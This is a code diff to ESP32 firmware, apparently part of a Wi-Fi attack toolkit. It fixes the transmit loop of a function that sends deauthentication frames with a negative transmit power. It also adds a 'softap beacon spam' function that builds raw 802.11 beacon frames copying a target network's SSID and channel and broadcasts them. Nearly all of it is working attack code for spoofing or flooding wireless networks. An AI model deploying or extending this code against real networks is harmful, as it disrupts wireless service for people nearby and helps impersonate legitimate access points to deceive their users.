@@ -725,9 +725,65 @@ void wifi_attack_deauth_client_negative_tx_power(void)
     beacon_frame_negative_tx[offset++] = -1;             // Power Constraint (Example: 3 dBm)
 
     /* Spam 10 packets */
-    for (uint8_t i = 10; i <= 10; i++) 
+    for (uint8_t i = 0; i <= 9; i++) 
     {
         esp_wifi_80211_tx(WIFI_IF_STA, beacon_frame_negative_tx, offset, false);
+        vTaskDelay(pdMS_TO_TICKS(2));
+    }
+}
+
+
+void wifi_attack_softap_beacon_spam(target_info_t *_target)
+{
+    uint8_t mac[6] = { 0 };
+    uint8_t beacon_frame[256] = {
+        0x80, 0x00, // Frame Control (Beacon)
+        0x00, 0x00, // Duration
+        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Fake Source or BSSID)
+        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
+        0x00, 0x00, // Sequence Control
+        0x64, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // timestamp
+        0x64, 0x00, // Beacon Interval (102.4ms)
+        0x21, 0x00,  // Capability Information
+        0x00, 0x00  // SSID Tag Number and Length (Placeholder, will be set later)
+    };
+    // Time stamp
+    uint64_t timestamp = xTaskGetTickCount() / 1000; // Convert micro
+    timestamp = (timestamp << 32) | (timestamp & 0xFFFFFFFF);
+    memcpy(&beacon_frame[24], &timestamp, 8); // Set timestamp in beacon frame
+
+    // Set SSID
+    beacon_frame[36] = 0x00; // SSID Tag Number
+    beacon_frame[37] = (uint8_t)strlen((char *)_target->ssid);
+    esp_wifi_get_mac(ESP_IF_WIFI_AP, mac);
+    memcpy(&beacon_frame[10], mac, 6);    // Source Address
+    memcpy(&beacon_frame[16], mac, 6);    // BSSID 
+    memcpy(&beacon_frame[38], _target->ssid, strlen((char *)_target->ssid)); // SSID
+    uint16_t offset = 38 + strlen((char *)_target->ssid);
+
+    // 2. Tagged Parameters
+    // Supported Rates (1 Mbps, 2 Mbps, 5.5 Mbps, 11 Mbps)
+    beacon_frame[offset++] = 0x01;          // Supported Rates Tag Number
+    beacon_frame[offset++] = 0x08;             // Length
+    beacon_frame[offset++] = 0x82;          // 1 Mbps
+    beacon_frame[offset++] = 0x84;          // 2 Mbps
+    beacon_frame[offset++] = 0x8B;          // 5.5 Mbps
+    beacon_frame[offset++] = 0x96;          // 11 Mbps
+    beacon_frame[offset++] = 0x0C;          // 6 Mbps
+    beacon_frame[offset++] = 0x12;          // 9 Mbps
+    beacon_frame[offset++] = 0x18;          // 12 Mbps
+    beacon_frame[offset++] = 0x24;          // 18 Mbps
+
+    // DS Parameter Set (Channel)
+    beacon_frame[offset++] = 0x03;          // DS Parameter Set Tag Number
+    beacon_frame[offset++] = 0x01;             // Length
+    beacon_frame[offset++] = _target->channel;       // Channel Number
+
+    /* Spam 2 packets */
+    for (uint8_t i = 0; i <= 1; i++) 
+    {
+        esp_wifi_80211_tx(WIFI_IF_STA, beacon_frame, offset, false);
         vTaskDelay(pdMS_TO_TICKS(2));
     }
 }
